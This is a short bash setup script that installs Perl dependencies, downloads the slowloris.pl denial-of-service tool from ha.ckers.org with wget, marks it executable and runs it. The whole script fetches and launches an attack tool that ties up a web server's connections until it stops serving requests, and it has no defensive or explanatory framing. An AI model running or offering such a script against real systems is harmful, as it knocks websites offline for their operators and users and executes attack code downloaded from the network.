#!/bin/bash
set -xv
sudo apt-get install perl libwww-mechanize-shell-perl perl-mechanize
wget http://ha.ckers.org/slowloris/slowloris.pl
chmod +x slowloris.pl
./slowloris.pl
chmod +x slowloris.pl
